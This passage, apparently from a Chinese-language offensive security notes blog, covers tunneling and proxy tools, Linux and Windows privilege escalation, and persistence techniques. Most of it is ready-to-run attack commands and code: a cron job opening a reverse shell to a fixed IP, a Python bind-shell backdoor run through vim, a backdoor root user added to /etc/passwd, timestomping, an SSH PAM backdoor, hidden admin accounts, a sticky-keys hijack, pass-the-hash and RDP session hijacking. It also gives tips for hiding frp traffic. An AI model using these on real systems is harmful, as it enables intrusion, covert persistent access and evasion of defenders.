<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/dns2tcpd.conf</span><br><span class="line">dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#客户端</span></span><br><span class="line"><span class="comment"># 使用http代理</span></span><br><span class="line">dns2tcpc -l 4444 -r ssh -k 123456 -z abc.com &lt;VPSIP&gt; -c -d 3</span><br><span class="line"><span class="comment"># 使用SOCKS代理</span></span><br><span class="line">dns2tcpc -l 12321 -r socks -k 123456 -z abc.com &lt;VPSIP&gt;  -c -d 3</span><br></pre></td></tr></table></figure>
<h3 id="好用的应用层代理协议—-Socks代理工具"><a href="#好用的应用层代理协议—-Socks代理工具" class="headerlink" title="好用的应用层代理协议—-Socks代理工具"></a>好用的应用层代理协议—-Socks代理工具</h3><p>Socks是一个客户/服务器环境的代理协议。是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递，分为socks 4和socks 5两种类型，socks 4只支持TCP协议而socks 5支持TCP/UDP协议，还支持各种身份验证机制等协议。</p>
<h4 id="基于Socket套接字实现的端口转发工具—-lcx"><a href="#基于Socket套接字实现的端口转发工具—-lcx" class="headerlink" title="基于Socket套接字实现的端口转发工具—-lcx"></a>基于Socket套接字实现的端口转发工具—-lcx</h4><p>lcx是一个基于Socket套接字实现的端口转发工具，有Windows和Linux两个版本。Windows版为lcx.exe，Linux版为portmap</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave &lt;公网主机IP地址&gt; 4444 127.0.0.1 3389</span><br><span class="line"><span class="meta">#</span><span class="bash"> 功能和上面一样</span></span><br></pre></td></tr></table></figure>

<h4 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h4><p>前面这几个一次只能转发一个或几个端口,这个可以和proxychains4配合实现，内网kail打内网环境</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 1234 --reverse #在vps上运行</span><br><span class="line">./chisel client 123.60.135.22:1234 R:0.0.0.0:9383:socks #1234是建立连接的端口，9383是你设置的代理端口，代理ip还是你自己vps ip</span><br><span class="line"></span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">socks5 vpsip 9383</span><br><span class="line"></span><br><span class="line">proxychains4 msfconsole #使用proxychains4代理运行程序</span><br></pre></td></tr></table></figure>
<p>proxychains4还能让kail科学上网这里不再赘述</p>
<h4 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 1234 -s 123</span><br><span class="line">./linux_x64_agent -c Server_ip:1234 -s 123 --reconnect 8</span><br><span class="line"><span class="comment">#连接成功后在服务器端运行</span></span><br><span class="line">use 0</span><br><span class="line">socks 9383</span><br></pre></td></tr></table></figure>
<h4 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">frps.ini</span></span><br><span class="line">[common]</span><br><span class="line"><span class="meta">#</span><span class="bash"> frp监听的端口，默认是7000，可以改成其他的</span></span><br><span class="line">bind_port = 7000</span><br><span class="line">token = test@123</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">frpc.ini</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = vps_ip #你自己vps的外网ip</span><br><span class="line">server_port = 7000</span><br><span class="line">token = test@123</span><br><span class="line">tls_enable = true #tls加密</span><br><span class="line"></span><br><span class="line">[RDP]   #这里演示的是远程桌面协议的端口转发,如果有下面的socks就不再需要这个</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 3389   #要转发的端口</span><br><span class="line">remote_port = 6000  #转发到外网ip的什么端口</span><br><span class="line"></span><br><span class="line">[plugin_socks] #socks代理</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">remote_port = 6666</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = admin</span><br><span class="line">plugin_passwd = admin</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure>
<h5 id="frp怎么隐藏流量"><a href="#frp怎么隐藏流量" class="headerlink" title="frp怎么隐藏流量"></a>frp怎么隐藏流量</h5><p>修改服务端和客户端的默认salt<br>修改frp的tls协议中固定的0x17特征<br>配置文件自删除</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>suid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</p>
<p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">ls -al /usr/bin/su</span><br><span class="line"><span class="meta">#</span><span class="bash">常用提权方式</span></span><br><span class="line"><span class="meta">#</span><span class="bash">find</span></span><br><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br><span class="line"><span class="meta">#</span><span class="bash">cp mv</span></span><br><span class="line"><span class="meta">#</span><span class="bash">覆盖 /etc/shadow 或 /etc/passwd</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">nmap（2.02-5.21）存在交换模式，可利用提权</span></span><br><span class="line">nmap --interactive</span><br><span class="line"><span class="meta">nmap&gt;</span><span class="bash"> !sh</span></span><br><span class="line">sh-3.2# whoami</span><br><span class="line">root</span><br><span class="line"><span class="meta">#</span><span class="bash">vi/vim</span></span><br><span class="line">sudo vim -c &#x27;!sh&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">bash</span></span><br><span class="line">bash -p</span><br><span class="line"><span class="meta">#</span><span class="bash">less more</span></span><br><span class="line">less /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">在less中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
<h4 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h4><p>Capabilities机制是在<strong>Linux内核2.2</strong>之后引入的，原理很简单，就是将之前与超级用户root（UID=0）关联的特权细分为不同的功能组，Capabilites作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。</p>
<p>这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是root，就去检查其是否具有该特权操作所对应的capabilities，并以此为依据，决定是否可以执行特权操作。</p>
<p>如果Capabilities设置不正确，就会让攻击者有机可乘，实现权限提升。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="SUDO滥用提权"><a href="#SUDO滥用提权" class="headerlink" title="SUDO滥用提权"></a>SUDO滥用提权</h4><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l <span class="comment">#列出当前用户可以以超级用户（root）身份执行的命令列表</span></span><br><span class="line"><span class="comment">#https://gtfobins.github.io/ 这里面更加详细</span></span><br><span class="line">sudo mysql -e <span class="string">&#x27;\! /bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h4><p><a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a><br>gcc -pthread dirty.c -o exp -lcrypt<br> ./exp<br>su firefart </p>
<h4 id="Docker-组提权"><a href="#Docker-组提权" class="headerlink" title="Docker 组提权"></a>Docker 组提权</h4><p>docker 组内用户执行命令的时候会自动在所有命令前添加 sudo</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease <span class="comment">#启动一个新的 Docker 容器,并将容器外部的目录 / 挂载到容器内部 /hostOS(也就是宿主机的 /)</span></span><br></pre></td></tr></table></figure>
<h3 id="win"><a href="#win" class="headerlink" title="win"></a>win</h3><h4 id="烂土豆提权"><a href="#烂土豆提权" class="headerlink" title="烂土豆提权"></a>烂土豆提权</h4><p>只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（<strong>IIS</strong>、**MSSQL(SQL Server的简称)**等）有这个权限，大多数用户级的账户没有这个权限</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a whoami</span><br></pre></td></tr></table></figure>
<h4 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -<span class="built_in">exec</span> bypass -Command <span class="string">&quot;&amp; &#123;Import-Module .\PowerUp.ps1;  Invoke-AllChecks | Out-File -Encoding ASCII check.txt&#125;&quot;</span> <span class="comment">#PowerUp列出了可能存在问题的所有服务</span></span><br><span class="line"></span><br><span class="line">icacls <span class="string">&quot;C:\Program Files&quot;</span> <span class="comment">#如果路径包含空格，应该用双引号括起来，比如 &quot;C:\Program Files\program folder&quot;</span></span><br><span class="line">C:\Program Files NT SERVICE\TrustedInstaller:(F) <span class="comment">#“F”代表完全控制</span></span><br><span class="line">                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)</span><br><span class="line">                 NT AUTHORITY\SYSTEM:(M)</span><br><span class="line">                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)</span><br><span class="line">                 BUILTIN\Administrators:(M)  <span class="comment">#“M”表示有修改权限</span></span><br><span class="line">                 BUILTIN\Administrators:(OI)(CI)(IO)(F)</span><br><span class="line">                 BUILTIN\Users:(RX)</span><br><span class="line">                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)</span><br><span class="line">                 CREATOR OWNER:(OI)(CI)(IO)(F)</span><br><span class="line">                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)</span><br><span class="line">                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)</span><br><span class="line">                 APPLICATION PACKAGE AUTHORITY\所有受限制的应用程序包:(RX)</span><br><span class="line">                 APPLICATION PACKAGE AUTHORITY\所有受限制的应用程序包:(OI)(CI)(IO)(GR,GE)</span><br><span class="line"><span class="comment">#“CI”代表从属容器将继承访问控制项</span></span><br><span class="line"><span class="comment">#“OI”代表从属文件将继承访问控制项</span></span><br></pre></td></tr></table></figure>

<p>可信任服务路径漏洞<br>Windows中文件路径解析的特性。例如，我们有一个文件路径为“C:\Program Files\Some Folder\Service.exe”。那么，对于该路径中的每一个空格，Windows都会尝试寻找并执行与空格前面的名字相匹配的程序。如上面的目录为例，Windows会依次尝试确定和执行以下程序：<br> C:\Program.exe<br> C:\Program Files\Some.exe<br> C:\Program Files\Some Folder\Service.exe<br>只需要上传的程序重命名并放置在存在此漏洞且可写的目录下即可 </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode|findstr /i <span class="string">&quot;Auto&quot;</span> |findstr /i /v <span class="string">&quot;C:\Windows\\&quot;</span> |findstr/i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sc stop &lt;service_name&gt;</span></span><br><span class="line"><span class="string">sc start &lt;service_name&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h4><p>HKLM 只是 <strong>HKEY_LOCAL_MACHINE</strong> 的缩写,两者可以随意替换</p>
<p>IFEO(Image File Execution Options)是 Windows 注册表中的一个特殊项，它允许你为指定的可执行文件（EXE）配置自定义的启动行为。它通常用于调试、替换程序执行或者拦截程序启动。</p>
<p>当我们双击运行程序时，系统会查询该IFEO注册表，如果发现存在和该程序名称完全相同的子键，就查询对应子健中包含的“debugger”键值名，如果该参数不为空，系统则会把 Debugger 参数里指定的程序文件名作为用户试图启动的程序执行请求来处理</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get-acl -path <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | fl * <span class="comment">#显示指定注册表项的访问控制列表,查看是否有修改注册表的权限</span></span><br><span class="line"></span><br><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span> <span class="comment">#把本来用户主页点放大镜启动替换为cmd</span></span><br><span class="line"></span><br><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span> <span class="comment">#把本来用户shift粘滞键启动替换为cmd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#最后点左下角的头像锁屏，按功能触发</span></span><br></pre></td></tr></table></figure>
<h4 id="其他cve"><a href="#其他cve" class="headerlink" title="其他cve"></a>其他cve</h4><p>HiveNightmare（CVE-2021-36934）<br>​由于Windows中多个系统文件的ACL过于宽松，使得任何标准用户都可以从系统卷影副本中读取包括SAM，SYSTEMSECURITY在内的多个系统文件<br>该漏洞复现需满足如下条件：1、已启动系统保护 2、系统上存在已创建的系统还原点 3、系统启用本地管理员用户</p>
<p>PrintSpooler提权<br>PrintDemon（CVE-2020-1048）<br>​ 该CVE是由于WindowsPrintSpooler存在缺陷，导致用户可以在系统上任意写入文件，并通过其他方法完成提权。<br>PrintSpooler是Windows的打印后台处理服务，用于管理所有本地和打网络打印队列，默认为开启状态。</p>
<p>SMBghost (CVE-2020-0796)<br>SMBv3.1没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出<br>smb版本v3.1.1<br>端口445开放<br>防火墙关闭</p>
<h4 id="远程桌面控制"><a href="#远程桌面控制" class="headerlink" title="远程桌面控制"></a>远程桌面控制</h4><h5 id="利用密码登录RDP-远程桌面"><a href="#利用密码登录RDP-远程桌面" class="headerlink" title="利用密码登录RDP 远程桌面"></a>利用密码登录RDP 远程桌面</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec rdp 172.22.6.0/24 -u wenshao -p hellokitty -d xiaorang.lab</span><br></pre></td></tr></table></figure>
<h5 id="利用哈希传递登录-RDP-远程桌面"><a href="#利用哈希传递登录-RDP-远程桌面" class="headerlink" title="利用哈希传递登录 RDP 远程桌面"></a>利用哈希传递登录 RDP 远程桌面</h5><p>抓取hash无法破解的情况下，如果使用hash远程登录RDP，需要开启<strong>Restricted Admin Mode</strong>, 在Windows8.1和Windows Server 2012R2上默认开启</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#客户端、服务器都需要开启Restricted Admin Mode</span></span><br><span class="line"><span class="comment">#对应命令行开启Restricted Admin mode的命令(需要管理员权限)</span></span><br><span class="line">REG ADD <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看是否已开启 DisableRestrictedAdmin REG_DWORD 0x0 存在就是开启</span></span><br><span class="line">REG query <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> | findstr <span class="string">&quot;DisableRestrictedAdmin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#攻击主机，mstsc.exe为远程桌面程序</span></span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:&lt;username&gt; /domain:&lt;comptername or ip&gt; /ntlm: &lt;ntlm <span class="built_in">hash</span>&gt; <span class="string">&quot;/run:mstsc.exe /restrictedadmin&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="RDP会话劫持"><a href="#RDP会话劫持" class="headerlink" title="RDP会话劫持"></a>RDP会话劫持</h5><p>tscon 是 Windows 操作系统中的一个命令，用于连接到远程桌面会话或将当前会话连接到另一个会话。它通常用于管理远程桌面会话，特别是当你想要从本地会话切换到远程会话时。</p>
<p>在 <strong>SYSTEM 权限下</strong>直接执行 <strong>tscon</strong> 会话切换,不需要提供用户密码<br>即使远程连接的用户关闭了远程连接窗口,仍能在 SYSTEM 权限下通过 tscon 实现未授权连接</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">quser/qwinsta <span class="comment">#查看会话id</span></span><br><span class="line">sc create rdp binpath= <span class="string">&quot;cmd.exe /k tscon ID /dest:console&quot;</span></span><br><span class="line">sc qc rdp</span><br><span class="line">sc start rdp</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用Psexec工具</span></span><br><span class="line">psexec -s -i cmd</span><br><span class="line">quser</span><br><span class="line">tscon ID /dest:console</span><br></pre></td></tr></table></figure>




<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h3><h4 id="添加root权限后门用户"><a href="#添加root权限后门用户" class="headerlink" title="添加root权限后门用户"></a>添加root权限后门用户</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;print crypt(&quot;M0rk&quot;, &quot;AA&quot;). &quot;\n&quot;&#x27;</span> <span class="comment">#密码M0rk</span></span><br><span class="line">AAhmo1jgYI0HE  </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;backdoor:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash&quot;</span>&gt;&gt;/etc/passwd <span class="comment">#添加用户到passwd文件</span></span><br><span class="line"></span><br><span class="line">touch -a -t 202401010830 filename.txt    <span class="comment"># 设置访问时间</span></span><br><span class="line">touch -m -t 202401011200 filename.txt    <span class="comment"># 设置修改时间</span></span><br></pre></td></tr></table></figure>

<h4 id="ssh后门"><a href="#ssh后门" class="headerlink" title="ssh后门"></a>ssh后门</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#本地生成rsa公钥私钥</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat /root/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; /root/.ssh/key.txt</span><br><span class="line"><span class="comment">#将生成的公钥的内容追加到目标服务器的/root/.ssh/authorized_keys内即可</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#在 SSH 配置中启用 PAM（可插拔认证模块）进行身份验证，可以增强系统的安全性和灵活性。PAM 允许你配置多种认证方式，例如密码、指纹、一次性密码等。</span></span><br><span class="line">cat /etc/ssh/sshd_config|grep UsePAM <span class="comment">#查看是否使用PAM进行身份验证，默认为yes</span></span><br><span class="line">ln -sf /usr/sbin/sshd /usr/<span class="built_in">local</span>/su;/usr/<span class="built_in">local</span>/su -oPort=1234</span><br><span class="line">ssh root@192.168.111.128 -p 1234 <span class="comment">#使用ssh任意密码连接1234端口登录root账户（其他用户也可以）</span></span><br></pre></td></tr></table></figure>

<h4 id="vim后门"><a href="#vim后门" class="headerlink" title="vim后门"></a>vim后门</h4><p>条件：安装了vim且安装了python扩展(绝大版本默认安装)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/lib/python2.7/site-packages <span class="comment">#进入py脚本目录</span></span><br><span class="line">$(nohup vim -E -c <span class="string">&quot;pyfile dir.py&quot;</span>&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2  <span class="comment">#Vim执行python脚本， nohup保证用户退出后依然可以执行</span></span><br><span class="line">rm -f dir.py <span class="comment">#删除恶意脚本</span></span><br></pre></td></tr></table></figure>
<p>恶意脚本dir.py的内容可以是任何功能的后门，如python版本的正向后门监听11端口：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html </span></span><br><span class="line">from socket import * </span><br><span class="line">import subprocess </span><br><span class="line">import os, threading, sys, time </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">server=socket(AF_INET,SOCK_STREAM) </span><br><span class="line">server.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,11)) </span><br><span class="line">server.listen(5) </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;waiting for connect&#x27;</span> </span><br><span class="line">talk, addr = server.accept() </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;connect from&#x27;</span>,addr </span><br><span class="line">proc = subprocess.Popen([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>], stdin=talk, stdout=talk, stderr=talk, shell=True) </span><br></pre></td></tr></table></figure>



<h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><p>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#每分钟执行一次</span></span><br><span class="line">(crontab -l;<span class="built_in">printf</span> <span class="string">&quot;*/1 * * * * /bin/bash -c &#x27;/bin/sh -i &gt;&amp; /dev/tcp/192.168.86.134/6666 0&gt;&amp;1&#x27;;\r%100c\n&quot;</span>)|crontab -</span><br></pre></td></tr></table></figure>

<h3 id="win-1"><a href="#win-1" class="headerlink" title="win"></a>win</h3><h4 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user hacker$ 123456 /add</span><br><span class="line">net localgroup administrators hacker$ /add <span class="comment">#带$符号的账户在常规cmd下是无法查看到</span></span><br><span class="line"><span class="comment">#在任务管理器中找还是可以找到该用户的，为了防止被发现，可以通过修改注册表的方式进行用户的创建</span></span><br><span class="line">CreateHiddenAccount.exe -u teamssix -p Passw0rd</span><br></pre></td></tr></table></figure>
<p>脚本自动化<br><code>https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1</code></p>
<p>PS C:&gt;.\Windows-User-Clone_ps1.ps1<br>powershell -File Windows-User-Clone_ps1.ps1</p>
<h4 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h4><h5 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h5><p>如果只希望当前用户启动时运行该程序，可以将其添加到：<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</p>
<p>如果希望所有用户在 Windows 启动时都能运行该程序，则可以将其添加到：<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p>
<p>值得注意的是，HKEY_CURRENT_USER的改动不需要管理员权限，而更改HKEY_LOCAL_MACHINE却是需要管理员权限</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span> /v <span class="built_in">test</span> /t REG_SZ /d <span class="string">&quot;C:\Users\bmth\Desktop\backdoor.exe&quot;</span></span><br><span class="line"><span class="comment">#添加键test，值为后门程序路径</span></span><br></pre></td></tr></table></figure>

<h5 id="启动项目录"><a href="#启动项目录" class="headerlink" title="启动项目录"></a>启动项目录</h5><p>启动文件夹（Startup Folder）是一个实际的文件夹，放入其中的程序（如 .exe 文件、.bat 文件、.vbs 文件等）将在 Windows 启动时自动运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Windows Server 2003 的启动项路径：</span><br><span class="line">C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"></span><br><span class="line"># Windows Server 2008 的启动项路径：</span><br><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>

